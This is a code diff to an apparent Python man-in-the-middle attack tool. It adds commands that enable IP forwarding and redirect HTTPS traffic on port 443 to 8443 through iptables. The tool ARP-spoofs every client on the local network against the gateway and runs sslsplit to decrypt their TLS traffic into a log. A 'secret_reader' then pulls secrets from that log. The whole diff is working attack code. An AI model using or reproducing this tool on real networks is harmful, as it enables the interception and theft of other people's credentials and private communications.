@@ -57,18 +57,26 @@ def secret_reader(log_file: Path):
 
 
 def main():
+    arp.run_silently("sysctl -w net.ipv4.ip_forward=1")
+    arp.run_silently("iptables -t nat --flush")
+    arp.run_silently(
+        "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443"
+    )
+
     clients, gateway_ip, gateway_mac = arp.arp_scan()
     arp.print_clients(clients)
     arp.spoof_all(clients, gateway_ip, gateway_mac)
 
-    log_file = Path("mitm.log")
-    with sslsplit(log_file), secret_reader(log_file):
-        while True:
-            try:
-                time.sleep(10)
-                arp.spoof_all(clients, gateway_ip, gateway_mac)
-            except KeyboardInterrupt:
-                break
+    try:
+        log_file = Path("mitm.log")
+        with sslsplit(log_file), secret_reader(log_file):
+            arp.keep_spoof(clients, gateway_ip, gateway_mac, 10)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        print("shutting down gracefully...")
+
+        arp.run_silently("iptables -t nat --flush")
 
 
 if __name__ == "__main__":
